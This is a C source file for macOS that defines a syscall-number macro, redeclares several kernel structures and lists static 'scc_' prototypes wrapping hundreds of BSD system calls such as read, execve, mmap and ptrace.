#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <dlfcn.h>

#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld.h>

#include <stdint.h>
#include <fcntl.h>
#include <sys/types.h>

#ifdef __x86_64
    #define POSIX_CALL_NUM(num) ( (0x02 << 24) | (num) )
#elif __arm64
    #define POSIX_CALL_NUM(num) (num)
#else
    #error "Unsupported architecture"
#endif

#include <sys/appleapiopts.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <signal.h>
#include <sys/attr.h>
#include <unistd.h>
#include <semaphore.h>
#include <sys/param.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <sys/event.h>
#include <sys/time.h>
#include <sys/sem.h>
#include <sys/resource.h>
#include <spawn.h>
#include <poll.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/mman.h>

typedef int     vm_prot_t;
typedef __uint32_t connid_t;
typedef __uint32_t associd_t;
typedef uint64_t guardid_t;

struct msghdr_x {
    void        *msg_name;  /* optional address */
    socklen_t   msg_namelen;    /* size of address */
    struct iovec    *msg_iov;   /* scatter/gather array */
    int     msg_iovlen; /* # elements in msg_iov */
    void        *msg_control;   /* ancillary data, see below */
    socklen_t   msg_controllen; /* ancillary data buffer len */
    int     msg_flags;  /* flags on received message */
    size_t      msg_datalen;    /* byte length of buffer in msg_iov */
};

struct eventreq {
  int      er_type;
#define EV_FD 1    // file descriptor
  int      er_handle;
  void    *er_data;
  int      er_rcnt;
  int      er_wcnt;
  int      er_ecnt;
  int      er_eventbits;
#define EV_RE  1
#define EV_WR  2
#define EV_EX  4
#define EV_RM  8
#define EV_MASK 0xf
};

struct mac {
    size_t m_buflen;
    char *m_string;
};

typedef struct mac *mac_t;

typedef union {
    u_int                       tunnel_interface_index;
    u_int                       scoped_interface_index;
    u_int32_t                   flow_divert_control_unit;
    u_int32_t                   filter_control_unit;
} necp_kernel_policy_routing_result_parameter;

typedef u_int32_t necp_kernel_policy_result;
typedef u_int32_t necp_kernel_policy_filter;

struct necp_aggregate_result {
    necp_kernel_policy_result           routing_result;
    necp_kernel_policy_routing_result_parameter routing_result_parameter;
    necp_kernel_policy_filter           filter_control_unit;
    necp_kernel_policy_result           service_action;
    uuid_t                              service_uuid;
    u_int32_t                           service_flags;
    u_int32_t                           service_data;
};

struct shared_file_mapping_np {
    mach_vm_address_t   sfm_address;
    mach_vm_size_t      sfm_size;
    mach_vm_offset_t    sfm_file_offset;
    vm_prot_t       sfm_max_prot;
    vm_prot_t       sfm_init_prot;
};

union user_semun {
    user_addr_t buf;        /* buffer for IPC_STAT & IPC_SET */
    user_addr_t array;      /* array for GETALL & SETALL */
};

typedef union user_semun user_semun_t;

typedef uint64_t return_t;

    __attribute__((noreturn)) static void scc_exit(int rval) ;
    static return_t scc_fork(void) ;
    static return_t scc_read(int fd, char* cbuf, user_size_t nbyte) ;
    static return_t scc_write(int fd, char* cbuf, user_size_t nbyte) ;
    static return_t scc_open(char* path, int flags, int mode) ;
    static return_t scc_close(int fd) ;
    static return_t scc_wait4(int pid, user_addr_t status, int options, user_addr_t rusage) ;
    static return_t scc_link(char* path, user_addr_t link) ;
    static return_t scc_unlink(char* path) ;
    static return_t scc_chdir(char* path) ;
    static return_t scc_fchdir(int fd) ;
    static return_t scc_mknod(char* path, int mode, int dev) ;
    static return_t scc_chmod(char* path, int mode) ;
    static return_t scc_chown(char* path, int uid, int gid) ;
    static return_t scc_getfsstat(char* buf, int bufsize, int flags) ;
    static return_t scc_getpid(void) ;
    static return_t scc_setuid(uid_t uid) ;
    static return_t scc_getuid(void) ;
    static return_t scc_geteuid(void) ;
    static return_t scc_ptrace(int req, pid_t pid, caddr_t addr, int data) ;
    static return_t scc_recvmsg(int s, struct msghdr *msg, int flags) ;
    static return_t scc_sendmsg(int s, caddr_t msg, int flags) ;
    static return_t scc_recvfrom(int s, void *buf, size_t len, int flags, struct sockaddr *from, int *fromlenaddr) ;
    static return_t scc_accept(int s, caddr_t name, socklen_t	*anamelen) ;
    static return_t scc_getpeername(int fdes, caddr_t asa, socklen_t *alen) ;
    static return_t scc_getsockname(int fdes, caddr_t asa, socklen_t *alen) ;
    static return_t scc_access(char* path, int flags) ;
    static return_t scc_chflags(char *path, int flags) ;
    static return_t scc_fchflags(int fd, int flags) ;
    static return_t scc_sync(void) ;
    static return_t scc_kill(int pid, int signum, int posix) ;
    static return_t scc_getppid(void) ;
    static return_t scc_dup(u_int fd) ;
    static return_t scc_pipe(void) ;
    static return_t scc_getegid(void) ;
    static return_t scc_sigaction(int signum, struct __sigaction *nsa, struct sigaction *osa) ;
    static return_t scc_getgid(void) ;
    static return_t scc_sigprocmask(int how, user_addr_t mask, user_addr_t omask) ;
    static return_t scc_getlogin(char *namebuf, u_int namelen) ;
    static return_t scc_setlogin(char *namebuf) ;
    static return_t scc_acct(char *path) ;
    static return_t scc_sigpending(struct sigvec *osv) ;
    static return_t scc_sigaltstack(const stack_t *restrict ss, stack_t *restrict oss) ;
    static return_t scc_ioctl(int fd, u_long com, caddr_t data) ;
    static return_t scc_reboot(int opt, char *command) ;
    static return_t scc_revoke(char *path) ;
    static return_t scc_symlink(char *path, char *link) ;
    static return_t scc_readlink(char *path, char *buf, int count) ;
    static return_t scc_execve(char *fname, char **argp, char **envp) ;
    static return_t scc_umask(int newmask) ;
    static return_t scc_chroot(char* path) ;
    static return_t scc_msync(caddr_t addr, size_t len, int flags) ;
    static return_t scc_vfork(void) ;
    static return_t scc_munmap(caddr_t addr, size_t len) ;
    static return_t scc_mprotect(caddr_t addr, size_t len, int prot) ;
    static return_t scc_madvise(caddr_t addr, size_t len, int behav) ;
    static return_t scc_mincore(user_addr_t addr, user_size_t len, user_addr_t vec) ;
    static return_t scc_getgroups(u_int gidsetsize, gid_t *gidset) ;
    static return_t scc_setgroups(u_int gidsetsize, gid_t *gidset) ;
    static return_t scc_getpgrp(void) ;
    static return_t scc_setpgid(int pid, int pgid) ;
    static return_t scc_setitimer(u_int which, struct itimerval *itv, struct itimerval *oitv) ;
    static return_t scc_swapon(void) ;
    static return_t scc_getitimer(u_int which, struct itimerval *itv) ;
    static return_t scc_getdtablesize(void) ;
    static return_t scc_dup2(u_int from, u_int to) ;
    static return_t scc_fcntl(int fd, int cmd, long arg) ;
    static return_t scc_select(int nd, u_int32_t *in, u_int32_t *ou, u_int32_t *ex, struct timeval *tv) ;
    static return_t scc_fsync(int fd) ;
    static return_t scc_setpriority(int which, id_t who, int prio) ;
    static return_t scc_socket(int domain, int type, int protocol) ;
    static return_t scc_connect(int s, caddr_t name, socklen_t namelen) ;
    static return_t scc_getpriority(int which, id_t who) ;
    static return_t scc_bind(int s, caddr_t name, socklen_t namelen) ;
    static return_t scc_setsockopt(int s, int level, int name, caddr_t val, socklen_t valsize) ;
    static return_t scc_listen(int s, int backlog) ;
    static return_t scc_sigsuspend(sigset_t mask) ;
    static return_t scc_gettimeofday(struct timeval *tp, struct timezone *tzp) ;
    static return_t scc_getrusage(int who, struct rusage *rusage) ;
    static return_t scc_getsockopt(int s, int level, int name, caddr_t val, socklen_t *avalsize) ;
    static return_t scc_readv(int fd, struct iovec *iovp, u_int iovcnt) ;
    static return_t scc_writev(int fd, struct iovec *iovp, u_int iovcnt) ;
    static return_t scc_settimeofday(struct timeval *tv, struct timezone *tzp) ;
    static return_t scc_fchown(int fd, int uid, int gid) ;
    static return_t scc_fchmod(int fd, int mode) ;
    static return_t scc_setreuid(uid_t ruid, uid_t euid) ;
    static return_t scc_setregid(gid_t rgid, gid_t egid) ;
    static return_t scc_rename(char *from, char *to) ;
    static return_t scc_flock(int fd, int how) ;
    static return_t scc_mkfifo(char* path, int mode) ;
    static return_t scc_sendto(int s, caddr_t buf, size_t len, int flags, caddr_t to, socklen_t tolen) ;
    static return_t scc_shutdown(int s, int how) ;
    static return_t scc_socketpair(int domain, int type, int protocol, int *rsv) ;
    static return_t scc_mkdir(char* path, int mode) ;
    static return_t scc_rmdir(char *path) ;
    static return_t scc_utimes(char *path, struct timeval *tptr) ;
    static return_t scc_futimes(int fd, struct timeval *tptr) ;
    static return_t scc_adjtime(struct timeval *delta, struct timeval *olddelta) ;
    static return_t scc_gethostuuid(unsigned char *uuid_buf, const struct timespec *timeoutp, int spi) ;
    static return_t scc_setsid(void) ;
    static return_t scc_getpgid(pid_t pid) ;
    static return_t scc_setprivexec(int flag) ;
    static return_t scc_pread(int fd, user_addr_t buf, user_size_t nbyte, off_t offset) ;
    static return_t scc_pwrite(int fd, user_addr_t buf, user_size_t nbyte, off_t offset) ;
    static return_t scc_nfssvc(int flag, caddr_t argp) ;
    static return_t scc_statfs(char *path, struct statfs *buf) ;
    static return_t scc_fstatfs(int fd, struct statfs *buf) ;
    static return_t scc_unmount(char* path, int flags) ;
    static return_t scc_getfh(char *fname, fhandle_t *fhp) ;
    static return_t scc_quotactl(const char *path, int cmd, int uid, caddr_t arg) ;
    static return_t scc_mount(char *type, char *path, int flags, caddr_t data) ;
    static return_t scc_csops(pid_t pid, uint32_t ops, user_addr_t useraddr, user_size_t usersize) ;
    static return_t scc_csops_audittoken(pid_t pid, uint32_t ops, user_addr_t useraddr, user_size_t usersize, user_addr_t uaudittoken) ;
    static return_t scc_waitid(idtype_t idtype, id_t id, siginfo_t *infop, int options) ;
    static return_t scc_kdebug_trace(int code, int arg1, int arg2, int arg3, int arg4, int arg5) ;
    static return_t scc_setgid(gid_t gid) ;
    static return_t scc_setegid(gid_t egid) ;
    static return_t scc_seteuid(uid_t euid) ;
    static return_t scc_sigreturn(void* *uctx, int infostyle) ;
    static return_t scc_chud(uint64_t code, uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4, uint64_t arg5) ;
    static return_t scc_fdatasync(int fd) ;
    static return_t scc_stat(user_addr_t path, user_addr_t ub) ;
    static return_t scc_fstat(int fd, user_addr_t ub) ;
    static return_t scc_lstat(user_addr_t path, user_addr_t ub) ;
    static return_t scc_pathconf(char *path, int name) ;
    static return_t scc_fpathconf(int fd, int name) ;
    static return_t scc_getrlimit(u_int which, struct rlimit *rlp) ;
    static return_t scc_setrlimit(u_int which, struct rlimit *rlp) ;
    static return_t scc_getdirentries(int fd, char *buf, u_int count, long *basep) ;
    static return_t scc_mmap(caddr_t addr, size_t len, int prot, int flags, int fd, off_t pos) ;
    static return_t scc_lseek(int fd, off_t offset, int whence) ;
    static return_t scc_truncate(char *path, off_t length) ;
    static return_t scc_ftruncate(int fd, off_t length) ;
    static return_t scc_sysctl(int *name, u_int namelen, void *old, size_t *oldlenp, void *new, size_t newlen) ;
    static return_t scc_mlock(caddr_t addr, size_t len) ;
    static return_t scc_munlock(caddr_t addr, size_t len) ;
    static return_t scc_undelete(user_addr_t path) ;
    static return_t scc_open_dprotected_np(user_addr_t path, int flags, int class, int dpflags, int mode) ;
    static return_t scc_getattrlist(const char *path, struct attrlist *alist, void *attributeBuffer, size_t bufferSize, u_long options) ;
    static return_t scc_setattrlist(const char *path, struct attrlist *alist, void *attributeBuffer, size_t bufferSize, u_long options) ;
    static return_t scc_getdirentriesattr(int fd, struct attrlist *alist, void *buffer, size_t buffersize, u_long *count, u_long *basep, u_long *newstate, u_long options) ;
    static return_t scc_exchangedata(const char *path1, const char *path2, u_long options) ;
    static return_t scc_searchfs(const char *path, struct fssearchblock *searchblock, uint32_t *nummatches, uint32_t scriptcode, uint32_t options, struct searchstate *state) ;
    static return_t scc_delete(user_addr_t path) ;
    static return_t scc_copyfile(char *from, char *to, int mode, int flags) ;
    static return_t scc_fgetattrlist(int fd, struct attrlist *alist, void *attributeBuffer, size_t bufferSize, u_long options) ;
    static return_t scc_fsetattrlist(int fd, struct attrlist *alist, void *attributeBuffer, size_t bufferSize, u_long options) ;
    static return_t scc_poll(struct pollfd *fds, u_int nfds, int timeout) ;
    static return_t scc_watchevent(struct eventreq *u_req, int u_eventmask) ;
    static return_t scc_waitevent(struct eventreq *u_req, struct timeval *tv) ;
    static return_t scc_modwatch(struct eventreq *u_req, int u_eventmask) ;
    static return_t scc_getxattr(user_addr_t path, user_addr_t attrname, user_addr_t value, size_t size, uint32_t position, int options) ;
    static return_t scc_fgetxattr(int fd, user_addr_t attrname, user_addr_t value, size_t size, uint32_t position, int options) ;
    static return_t scc_setxattr(user_addr_t path, user_addr_t attrname, user_addr_t value, size_t size, uint32_t position, int options) ;
    static return_t scc_fsetxattr(int fd, user_addr_t attrname, user_addr_t value, size_t size, uint32_t position, int options) ;
    static return_t scc_removexattr(user_addr_t path, user_addr_t attrname, int options) ;
    static return_t scc_fremovexattr(int fd, user_addr_t attrname, int options) ;
    static return_t scc_listxattr(user_addr_t path, user_addr_t namebuf, size_t bufsize, int options) ;
    static return_t scc_flistxattr(int fd, user_addr_t namebuf, size_t bufsize, int options) ;
    static return_t scc_fsctl(const char *path, u_long cmd, caddr_t data, u_int options) ;
    static return_t scc_initgroups(u_int gidsetsize, gid_t *gidset, int gmuid) ;
    static return_t scc_posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *adesc, char **argv, char **envp) ;
    static return_t scc_ffsctl(int fd, u_long cmd, caddr_t data, u_int options) ;
    static return_t scc_nfsclnt(int flag, caddr_t argp) ;
    static return_t scc_fhopen(const struct fhandle *u_fhp, int flags) ;
    static return_t scc_minherit(void *addr, size_t len, int inherit) ;
    static return_t scc_semsys(u_int which, int a2, int a3, int a4, int a5) ;
    static return_t scc_msgsys(u_int which, int a2, int a3, int a4, int a5) ;
    static return_t scc_shmsys(u_int which, int a2, int a3, int a4) ;
    static return_t scc_semctl(int semid, int semnum, int cmd, user_semun_t arg) ;
    static return_t scc_semget(key_t key, int	nsems, int semflg) ;
    static return_t scc_semop(int semid, struct sembuf *sops, int nsops) ;
    static return_t scc_msgctl(int msqid, int cmd, struct	msqid_ds *buf) ;
    static return_t scc_msgget(key_t key, int msgflg) ;
    static return_t scc_msgsnd(int msqid, void *msgp, size_t msgsz, int msgflg) ;
    static return_t scc_msgrcv(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg) ;
    static return_t scc_shmat(int shmid, void *shmaddr, int shmflg) ;
    static return_t scc_shmctl(int shmid, int cmd, struct shmid_ds *buf) ;
    static return_t scc_shmdt(void *shmaddr) ;
    static return_t scc_shmget(key_t key, size_t size, int shmflg) ;
    static return_t scc_shm_open(const char *name, int oflag, int mode) ;
    static return_t scc_shm_unlink(const char *name) ;
    static return_t scc_sem_open(const char *name, int oflag, int mode, int value) ;
    static return_t scc_sem_close(sem_t *sem) ;
    static return_t scc_sem_unlink(const char *name) ;
    static return_t scc_sem_wait(sem_t *sem) ;
    static return_t scc_sem_trywait(sem_t *sem) ;
    static return_t scc_sem_post(sem_t *sem) ;
    static return_t scc_sysctlbyname(const char *name, size_t namelen, void *old, size_t *oldlenp, void *new, size_t newlen) ;
    static return_t scc_open_extended(user_addr_t path, int flags, uid_t uid, gid_t gid, int mode, user_addr_t xsecurity) ;
    static return_t scc_umask_extended(int newmask, user_addr_t xsecurity) ;
    static return_t scc_stat_extended(user_addr_t path, user_addr_t ub, user_addr_t xsecurity, user_addr_t xsecurity_size) ;
    static return_t scc_lstat_extended(user_addr_t path, user_addr_t ub, user_addr_t xsecurity, user_addr_t xsecurity_size) ;
    static return_t scc_fstat_extended(int fd, user_addr_t ub, user_addr_t xsecurity, user_addr_t xsecurity_size) ;
    static return_t scc_chmod_extended(user_addr_t path, uid_t uid, gid_t gid, int mode, user_addr_t xsecurity) ;
    static return_t scc_fchmod_extended(int fd, uid_t uid, gid_t gid, int mode, user_addr_t xsecurity) ;
    static return_t scc_access_extended(user_addr_t entries, size_t size, user_addr_t results, uid_t uid) ;
    static return_t scc_settid(uid_t uid, gid_t gid) ;
    static return_t scc_gettid(uid_t *uidp, gid_t *gidp) ;
    static return_t scc_setsgroups(int setlen, user_addr_t guidset) ;
    static return_t scc_getsgroups(user_addr_t setlen, user_addr_t guidset) ;
    static return_t scc_setwgroups(int setlen, user_addr_t guidset) ;
    static return_t scc_getwgroups(user_addr_t setlen, user_addr_t guidset) ;
    static return_t scc_mkfifo_extended(user_addr_t path, uid_t uid, gid_t gid, int mode, user_addr_t xsecurity) ;
    static return_t scc_mkdir_extended(user_addr_t path, uid_t uid, gid_t gid, int mode, user_addr_t xsecurity) ;
    static return_t scc_identitysvc(int opcode, user_addr_t message) ;
    static return_t scc_shared_region_check_np(uint64_t *start_address) ;
    static return_t scc_vm_pressure_monitor(int wait_for_pressure, int nsecs_monitored, uint32_t *pages_reclaimed) ;
    static return_t scc_psynch_rw_longrdlock(user_addr_t rwlock, uint32_t lgenval, uint32_t ugenval, uint32_t rw_wc, int flags) ;
    static return_t scc_psynch_rw_yieldwrlock(user_addr_t rwlock, uint32_t lgenval, uint32_t ugenval, uint32_t rw_wc, int flags) ;
    static return_t scc_psynch_mutexwait(user_addr_t mutex,  uint32_t mgen, uint32_t  ugen, uint64_t tid, uint32_t flags) ;
    static return_t scc_psynch_mutexdrop(user_addr_t mutex,  uint32_t mgen, uint32_t  ugen, uint64_t tid, uint32_t flags) ;
    static return_t scc_psynch_cvbroad(user_addr_t cv, uint64_t cvlsgen, uint64_t cvudgen, uint32_t flags, user_addr_t mutex,  uint64_t mugen, uint64_t tid) ;
    static return_t scc_psynch_cvsignal(user_addr_t cv, uint64_t cvlsgen, uint32_t cvugen, int thread_port, user_addr_t mutex,  uint64_t mugen, uint64_t tid, uint32_t flags) ;
    static return_t scc_psynch_cvwait(user_addr_t cv, uint64_t cvlsgen, uint32_t cvugen, user_addr_t mutex,  uint64_t mugen, uint32_t flags, int64_t sec, uint32_t nsec) ;
    static return_t scc_psynch_rw_rdlock(user_addr_t rwlock, uint32_t lgenval, uint32_t ugenval, uint32_t rw_wc, int flags) ;
    static return_t scc_psynch_rw_wrlock(user_addr_t rwlock, uint32_t lgenval, uint32_t ugenval, uint32_t rw_wc, int flags) ;
    static return_t scc_psynch_rw_unlock(user_addr_t rwlock, uint32_t lgenval, uint32_t ugenval, uint32_t rw_wc, int flags) ;
    static return_t scc_psynch_rw_unlock2(user_addr_t rwlock, uint32_t lgenval, uint32_t ugenval, uint32_t rw_wc, int flags) ;
    static return_t scc_getsid(pid_t pid) ;
    static return_t scc_settid_with_pid(pid_t pid, int assume) ;
    static return_t scc_psynch_cvclrprepost(user_addr_t cv, uint32_t cvgen, uint32_t cvugen, uint32_t cvsgen, uint32_t prepocnt, uint32_t preposeq, uint32_t flags) ;
    static return_t scc_aio_fsync(int op, user_addr_t aiocbp) ;
    static return_t scc_aio_return(user_addr_t aiocbp) ;
    static return_t scc_aio_suspend(user_addr_t aiocblist, int nent, user_addr_t timeoutp) ;
    static return_t scc_aio_cancel(int fd, user_addr_t aiocbp) ;
    static return_t scc_aio_error(user_addr_t aiocbp) ;
    static return_t scc_aio_read(user_addr_t aiocbp) ;
    static return_t scc_aio_write(user_addr_t aiocbp) ;
    static return_t scc_lio_listio(int mode, user_addr_t aiocblist, int nent, user_addr_t sigp) ;
    static return_t scc_iopolicysys(int cmd, void *arg) ;
    static return_t scc_process_policy(int scope, int action, int policy, int policy_subtype, user_addr_t attrp, pid_t target_pid, uint64_t target_threadid) ;
    static return_t scc_mlockall(int how) ;
    static return_t scc_munlockall(int how) ;
    static return_t scc_issetugid(void) ;
    static return_t scc___pthread_kill(int thread_port, int sig) ;
    static return_t scc___pthread_sigmask(int how, user_addr_t set, user_addr_t oset) ;
    static return_t scc___sigwait(user_addr_t set, user_addr_t sig) ;
    static return_t scc___disable_threadsignal(int value) ;
    static return_t scc___pthread_markcancel(int thread_port) ;
    static return_t scc___pthread_canceled(int  action) ;
    static return_t scc___semwait_signal(int cond_sem, int mutex_sem, int timeout, int relative, int64_t tv_sec, int32_t tv_nsec) ;
    static return_t scc_proc_info(int32_t callnum,int32_t pid,uint32_t flavor, uint64_t arg,user_addr_t buffer,int32_t buffersize) ;
    static return_t scc_sendfile(int fd, int s, off_t offset, off_t *nbytes, struct sf_hdtr *hdtr, int flags) ;
    static return_t scc_stat64(user_addr_t path, user_addr_t ub) ;
    static return_t scc_fstat64(int fd, user_addr_t ub) ;
    static return_t scc_lstat64(user_addr_t path, user_addr_t ub) ;
    static return_t scc_stat64_extended(user_addr_t path, user_addr_t ub, user_addr_t xsecurity, user_addr_t xsecurity_size) ;
    static return_t scc_lstat64_extended(user_addr_t path, user_addr_t ub, user_addr_t xsecurity, user_addr_t xsecurity_size) ;
    static return_t scc_fstat64_extended(int fd, user_addr_t ub, user_addr_t xsecurity, user_addr_t xsecurity_size) ;
    static return_t scc_getdirentries64(int fd, void *buf, user_size_t bufsize, off_t *position) ;
    static return_t scc_statfs64(char *path, void *buf) ;
    static return_t scc_fstatfs64(int fd, void *buf) ;
    static return_t scc_getfsstat64(user_addr_t buf, int bufsize, int flags) ;
    static return_t scc___pthread_chdir(user_addr_t path) ;
    static return_t scc___pthread_fchdir(int fd) ;
    static return_t scc_audit(void *record, int length) ;
    static return_t scc_auditon(int cmd, void *data, int length) ;
    static return_t scc_getauid(au_id_t *auid) ;
    static return_t scc_setauid(au_id_t *auid) ;
    static return_t scc_getaudit_addr(struct auditinfo_addr *auditinfo_addr, int length) ;
    static return_t scc_setaudit_addr(struct auditinfo_addr *auditinfo_addr, int length) ;
    static return_t scc_auditctl(char *path) ;
    static return_t scc_bsdthread_create(user_addr_t func, user_addr_t func_arg, user_addr_t stack, user_addr_t pthread, uint32_t flags) ;
    static return_t scc_bsdthread_terminate(user_addr_t stackaddr, size_t freesize, uint32_t port, uint32_t sem) ;
    static return_t scc_kqueue(void) ;
    static return_t scc_kevent(int fd, const struct kevent *changelist, int nchanges, struct kevent *eventlist, int nevents, const struct timespec *timeout) ;
    static return_t scc_lchown(user_addr_t path, uid_t owner, gid_t group) ;
    static return_t scc_stack_snapshot(pid_t pid, user_addr_t tracebuf, uint32_t tracebuf_size, uint32_t flags, uint32_t dispatch_offset) ;
    static return_t scc_bsdthread_register(user_addr_t threadstart, user_addr_t wqthread, uint32_t flags, user_addr_t stack_addr_hint, user_addr_t targetconc_ptr, uint32_t dispatchqueue_offset, uint32_t tsd_offset) ;
    static return_t scc_workq_open(void) ;
    static return_t scc_workq_kernreturn(int options, user_addr_t item, int affinity, int prio) ;
    static return_t scc_kevent64(int fd, const struct kevent64_s *changelist, int nchanges, struct kevent64_s *eventlist, int nevents, unsigned int flags, const struct timespec *timeout) ;
    static return_t scc___old_semwait_signal(int cond_sem, int mutex_sem, int timeout, int relative, const struct timespec *ts) ;
    static return_t scc___old_semwait_signal_nocancel(int cond_sem, int mutex_sem, int timeout, int relative, const struct timespec *ts) ;
    static return_t scc_thread_selfid(void) ;
    static return_t scc_ledger(int cmd, caddr_t arg1, caddr_t arg2, caddr_t arg3) ;
    static return_t scc___mac_execve(char *fname, char **argp, char **envp, mac_t mac_p) ;
    static return_t scc___mac_get_file(char *path_p, mac_t mac_p) ;
    static return_t scc___mac_set_file(char *path_p, mac_t mac_p) ;
    static return_t scc___mac_get_link(char *path_p, mac_t mac_p) ;
    static return_t scc___mac_set_link(char *path_p, mac_t mac_p) ;
    static return_t scc___mac_get_proc(mac_t mac_p) ;
    static return_t scc___mac_set_proc(mac_t mac_p) ;
    static return_t scc___mac_get_fd(int fd, mac_t mac_p) ;
    static return_t scc___mac_set_fd(int fd, mac_t mac_p) ;
    static return_t scc___mac_get_pid(pid_t pid, mac_t mac_p) ;
    static return_t scc___mac_get_lcid(pid_t lcid, mac_t mac_p) ;
    static return_t scc___mac_get_lctx(mac_t mac_p) ;
    static return_t scc___mac_set_lctx(mac_t mac_p) ;
    static return_t scc_setlcid(pid_t pid, pid_t lcid) ;
    static return_t scc_getlcid(pid_t pid) ;
    static return_t scc_read_nocancel(int fd, user_addr_t cbuf, user_size_t nbyte) ;
    static return_t scc_write_nocancel(int fd, user_addr_t cbuf, user_size_t nbyte) ;
    static return_t scc_open_nocancel(user_addr_t path, int flags, int mode) ;
    static return_t scc_close_nocancel(int fd) ;
    static return_t scc_wait4_nocancel(int pid, user_addr_t status, int options, user_addr_t rusage) ;
    static return_t scc_recvmsg_nocancel(int s, struct msghdr *msg, int flags) ;
    static return_t scc_sendmsg_nocancel(int s, caddr_t msg, int flags) ;
    static return_t scc_recvfrom_nocancel(int s, void *buf, size_t len, int flags, struct sockaddr *from, int *fromlenaddr) ;
    static return_t scc_accept_nocancel(int s, caddr_t name, socklen_t	*anamelen) ;
    static return_t scc_msync_nocancel(caddr_t addr, size_t len, int flags) ;
    static return_t scc_fcntl_nocancel(int fd, int cmd, long arg) ;
    static return_t scc_select_nocancel(int nd, u_int32_t *in, u_int32_t *ou, u_int32_t *ex, struct timeval *tv) ;
    static return_t scc_fsync_nocancel(int fd) ;
    static return_t scc_connect_nocancel(int s, caddr_t name, socklen_t namelen) ;
    static return_t scc_sigsuspend_nocancel(sigset_t mask) ;
    static return_t scc_readv_nocancel(int fd, struct iovec *iovp, u_int iovcnt) ;
    static return_t scc_writev_nocancel(int fd, struct iovec *iovp, u_int iovcnt) ;
    static return_t scc_sendto_nocancel(int s, caddr_t buf, size_t len, int flags, caddr_t to, socklen_t tolen) ;
    static return_t scc_pread_nocancel(int fd, user_addr_t buf, user_size_t nbyte, off_t offset) ;
    static return_t scc_pwrite_nocancel(int fd, user_addr_t buf, user_size_t nbyte, off_t offset) ;
    static return_t scc_waitid_nocancel(idtype_t idtype, id_t id, siginfo_t *infop, int options) ;
    static return_t scc_poll_nocancel(struct pollfd *fds, u_int nfds, int timeout) ;
    static return_t scc_msgsnd_nocancel(int msqid, void *msgp, size_t msgsz, int msgflg) ;
    static return_t scc_msgrcv_nocancel(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg) ;
    static return_t scc_sem_wait_nocancel(sem_t *sem) ;
    static return_t scc_aio_suspend_nocancel(user_addr_t aiocblist, int nent, user_addr_t timeoutp) ;
    static return_t scc___sigwait_nocancel(user_addr_t set, user_addr_t sig) ;
    static return_t scc___semwait_signal_nocancel(int cond_sem, int mutex_sem, int timeout, int relative, int64_t tv_sec, int32_t tv_nsec) ;
    static return_t scc___mac_mount(char *type, char *path, int flags, caddr_t data, mac_t mac_p) ;
    static return_t scc___mac_get_mount(char *path, mac_t mac_p) ;
    static return_t scc___mac_getfsstat(user_addr_t buf, int bufsize, user_addr_t mac, int macsize, int flags) ;
    static return_t scc_fsgetpath(user_addr_t buf, size_t bufsize, user_addr_t fsid, uint64_t objid) ;
    static return_t scc_audit_session_self(void) ;
    static return_t scc_audit_session_join(mach_port_name_t port) ;
    static return_t scc_fileport_makeport(int fd, user_addr_t portnamep) ;
    static return_t scc_fileport_makefd(mach_port_name_t port) ;
    static return_t scc_audit_session_port(au_asid_t asid, user_addr_t portnamep) ;
    static return_t scc_pid_suspend(int pid) ;
    static return_t scc_pid_resume(int pid) ;
    static return_t scc_shared_region_map_and_slide_np(int fd, uint32_t count, const struct shared_file_mapping_np *mappings, uint32_t slide, uint64_t* slide_start, uint32_t slide_size) ;
    static return_t scc_kas_info(int selector, void *value, size_t *size) ;
    static return_t scc_memorystatus_control(uint32_t command, int32_t pid, uint32_t flags, user_addr_t buffer, size_t buffersize) ;
    static return_t scc_guarded_open_np(const char *path, const guardid_t *guard, u_int guardflags, int flags, int mode) ;
    static return_t scc_guarded_close_np(int fd, const guardid_t *guard) ;
    static return_t scc_guarded_kqueue_np(const guardid_t *guard, u_int guardflags) ;
    static return_t scc_change_fdguard_np(int fd, const guardid_t *guard, u_int guardflags, const guardid_t *nguard, u_int nguardflags, int *fdflagsp) ;
    static return_t scc_proc_rlimit_control(pid_t pid, int flavor, void *arg) ;
    static return_t scc_connectx(int s, struct sockaddr *src, socklen_t srclen, struct sockaddr *dsts, socklen_t dstlen, uint32_t ifscope, associd_t aid, connid_t *cid) ;
    static return_t scc_disconnectx(int s, associd_t aid, connid_t cid) ;
    static return_t scc_peeloff(int s, associd_t aid) ;
    static return_t scc_socket_delegate(int domain, int type, int protocol, pid_t epid) ;
    static return_t scc_telemetry(uint64_t cmd, uint64_t deadline, uint64_t interval, uint64_t leeway, uint64_t arg4, uint64_t arg5) ;
    static return_t scc_proc_uuid_policy(uint32_t operation, uuid_t uuid, size_t uuidlen, uint32_t flags) ;
    static return_t scc_memorystatus_get_level(user_addr_t level) ;
    static return_t scc_system_override(uint64_t timeout, uint64_t flags) ;
    static return_t scc_vfs_purge(void) ;
    static return_t scc_sfi_ctl(uint32_t operation, uint32_t sfi_class, uint64_t time, uint64_t *out_time) ;
    static return_t scc_sfi_pidctl(uint32_t operation, pid_t pid, uint32_t sfi_flags, uint32_t *out_sfi_flags) ;
    static return_t scc_necp_match_policy(uint8_t *parameters, size_t parameters_size, struct necp_aggregate_result *returned_result) ;
    static return_t scc_getattrlistbulk(int dirfd, struct attrlist *alist, void *attributeBuffer, size_t bufferSize, uint64_t options) ;
    static return_t scc_openat(int fd, user_addr_t path, int flags, int mode) ;
    static return_t scc_openat_nocancel(int fd, user_addr_t path, int flags, int mode) ;
    static return_t scc_renameat(int fromfd, char *from, int tofd, char *to) ;
    static return_t scc_faccessat(int fd, user_addr_t path, int amode, int flag) ;
    static return_t scc_fchmodat(int fd, user_addr_t path, int mode, int flag) ;
    static return_t scc_fchownat(int fd, user_addr_t path, uid_t uid,gid_t gid, int flag) ;
    static return_t scc_fstatat(int fd, user_addr_t path, user_addr_t ub, int flag) ;
    static return_t scc_fstatat64(int fd, user_addr_t path, user_addr_t ub, int flag) ;
    static return_t scc_linkat(int fd1, user_addr_t path, int fd2, user_addr_t link, int flag) ;
    static return_t scc_unlinkat(int fd, user_addr_t path, int flag) ;
